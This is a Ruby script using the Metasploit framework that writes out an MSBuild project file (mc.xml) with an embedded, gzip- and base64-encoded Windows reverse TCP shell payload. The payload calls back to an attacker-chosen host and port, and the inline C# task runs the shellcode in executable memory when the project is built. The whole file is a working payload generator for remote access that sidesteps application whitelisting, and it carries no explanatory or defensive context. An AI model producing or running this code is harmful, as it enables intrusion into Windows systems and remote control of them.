#!/usr/bin/env ruby

require 'msfenv'
require 'msf/core'
require 'msf/base'
require 'rex'
require 'rex/mime'

lhost = ARGV[0]
lport = ARGV[1] || "8443"

def usage
	puts "[*] #{$0} <callback> <callback_port>"
	puts "[*] Ex. #{$0} 192.168.0.10 8787 (default callback port is 8443)"
	exit
end

usage if ARGV.size < 1


$framework = Msf::Simple::Framework.create(
	:module_types => [ Msf::MODULE_PAYLOAD, Msf::MODULE_ENCODER, Msf::MODULE_NOP ]
)
payload = $framework.payloads.create("windows/shell_reverse_tcp")
shellcode = Msf::Simple::Payload.generate_simple(payload,
		{
			'OptionStr' => "LHOST=#{lhost} LPORT=#{lport}",
			'ExitFunc'  => "thread",
			'Format'    => 'raw',
		})

gzip_it = Rex::Text.gzip(shellcode)
encode_it = Rex::Text.encode_base64(gzip_it)

xml = %Q|
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
	<Target Name="#{Rex::Text.rand_text_alpha_upper(10)}">
		<FragmentExample />
		<MeterExecute />
	</Target>
  
	<UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
		<ParameterGroup/>
		<Task>
			<Using Namespace="System" />  
			<Code Type="Fragment" Language="cs">
			<![CDATA[
			]]>
			</Code>
		</Task>
	</UsingTask>
	
	<UsingTask TaskName="MeterExecute" TaskFactory="CodeTaskFactory" AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
		<ParameterGroup/>
		<Task>
			<Using Namespace="System" />
			<Using Namespace="System.Reflection" />
			<Code Type="Class" Language="cs">
				<![CDATA[
				
				using System;
				using System.IO;
				using Microsoft.Build.Framework;
				using Microsoft.Build.Utilities;
				using System.IO.Compression;
				using System.Runtime.InteropServices;
				using System.Threading;
				
				public class MeterExecute :  Task, ITask
				{
					public override bool Execute()
					{
						IntPtr shellcodeProcessHandle = IntPtr.Zero;
						String ShellCode_B64 = "#{encode_it}";
						byte[] ShellCode_gzip = Convert.FromBase64String(ShellCode_B64);
						byte[] ShellCode_c = Decompress(ShellCode_gzip);
						shellcodeProcessHandle = exec_shellcode(ShellCode_c);
						WaitForSingleObject(shellcodeProcessHandle, 0xFFFFFFFF);
						return true;
					}
					
					static byte[] Decompress(byte[] data)
					{
						using (var compressedStream = new MemoryStream(data))
						using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
						using (var resultStream = new MemoryStream())
						{
							zipStream.CopyTo(resultStream);
							return resultStream.ToArray();
						}
					}
					
					private static IntPtr exec_shellcode(byte[] shellcode)
					{
						UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
						IntPtr hThread = IntPtr.Zero;
						UInt32 threadId = 0;
						IntPtr pinfo = IntPtr.Zero;
						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
						return hThread;
					}
					private static UInt32 MEM_COMMIT = 0x1000;
					private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
					[DllImport("kernel32")]
					private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
					 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
					[DllImport("kernel32")]
					private static extern IntPtr CreateThread(
						UInt32 lpThreadAttributes,
						UInt32 dwStackSize,
						UInt32 lpStartAddress,
						IntPtr param,
						UInt32 dwCreationFlags,
						ref UInt32 lpThreadId
					);
					[DllImport("kernel32")]
					private static extern UInt32 WaitForSingleObject(
						IntPtr hHandle,
						UInt32 dwMilliseconds
					);
				}
				
				]]>
			</Code>
		</Task>
	</UsingTask>
</Project>
|

begin
	puts "[*] Creating 'mc.xml'"
	fd = File.new("mc.xml","wb")
	fd.write(xml)
	fd.close
rescue => e
	puts "[!] #{e.to_s}"
end
